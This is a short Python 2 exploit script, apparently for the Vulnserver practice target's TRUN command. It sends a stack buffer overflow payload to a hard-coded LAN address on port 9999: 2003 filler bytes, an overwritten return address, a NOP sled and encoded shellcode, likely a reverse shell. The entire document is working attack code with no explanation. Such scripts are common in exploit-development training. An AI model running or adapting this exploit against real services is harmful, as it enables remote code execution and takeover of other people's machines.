#!/usr/bin/python

import sys, socket

overflow = (
"\xda\xca\xd9\x74\x24\xf4\xbe\x6c\xca\x22\xa3\x5b\x31\xc9\xb1"
"\x52\x31\x73\x17\x03\x73\x17\x83\x87\x36\xc0\x56\xab\x2f\x87"
"\x99\x53\xb0\xe8\x10\xb6\x81\x28\x46\xb3\xb2\x98\x0c\x91\x3e"
"\x52\x40\x01\xb4\x16\x4d\x26\x7d\x9c\xab\x09\x7e\x8d\x88\x08"
"\xfc\xcc\xdc\xea\x3d\x1f\x11\xeb\x7a\x42\xd8\xb9\xd3\x08\x4f"
"\x2d\x57\x44\x4c\xc6\x2b\x48\xd4\x3b\xfb\x6b\xf5\xea\x77\x32"
"\xd5\x0d\x5b\x4e\x5c\x15\xb8\x6b\x16\xae\x0a\x07\xa9\x66\x43"
"\xe8\x06\x47\x6b\x1b\x56\x80\x4c\xc4\x2d\xf8\xae\x79\x36\x3f"
"\xcc\xa5\xb3\xdb\x76\x2d\x63\x07\x86\xe2\xf2\xcc\x84\x4f\x70"
"\x8a\x88\x4e\x55\xa1\xb5\xdb\x58\x65\x3c\x9f\x7e\xa1\x64\x7b"
"\x1e\xf0\xc0\x2a\x1f\xe2\xaa\x93\x85\x69\x46\xc7\xb7\x30\x0f"
"\x24\xfa\xca\xcf\x22\x8d\xb9\xfd\xed\x25\x55\x4e\x65\xe0\xa2"
"\xb1\x5c\x54\x3c\x4c\x5f\xa5\x15\x8b\x0b\xf5\x0d\x3a\x34\x9e"
"\xcd\xc3\xe1\x31\x9d\x6b\x5a\xf2\x4d\xcc\x0a\x9a\x87\xc3\x75"
"\xba\xa8\x09\x1e\x51\x53\xda\xe1\x0e\x5e\x59\x8a\x4c\x60\x4c"
"\x16\xd8\x86\x04\xb6\x8c\x11\xb1\x2f\x95\xe9\x20\xaf\x03\x94"
"\x63\x3b\xa0\x69\x2d\xcc\xcd\x79\xda\x3c\x98\x23\x4d\x42\x36"
"\x4b\x11\xd1\xdd\x8b\x5c\xca\x49\xdc\x09\x3c\x80\x88\xa7\x67"
"\x3a\xae\x35\xf1\x05\x6a\xe2\xc2\x88\x73\x67\x7e\xaf\x63\xb1"
"\x7f\xeb\xd7\x6d\xd6\xa5\x81\xcb\x80\x07\x7b\x82\x7f\xce\xeb"
"\x53\x4c\xd1\x6d\x5c\x99\xa7\x91\xed\x74\xfe\xae\xc2\x10\xf6"
"\xd7\x3e\x81\xf9\x02\xfb\xa1\x1b\x86\xf6\x49\x82\x43\xbb\x17"
"\x35\xbe\xf8\x21\xb6\x4a\x81\xd5\xa6\x3f\x84\x92\x60\xac\xf4"
"\x8b\x04\xd2\xab\xac\x0c")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.5.108' , 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print"Error connecting to the server"
    sys.exit()

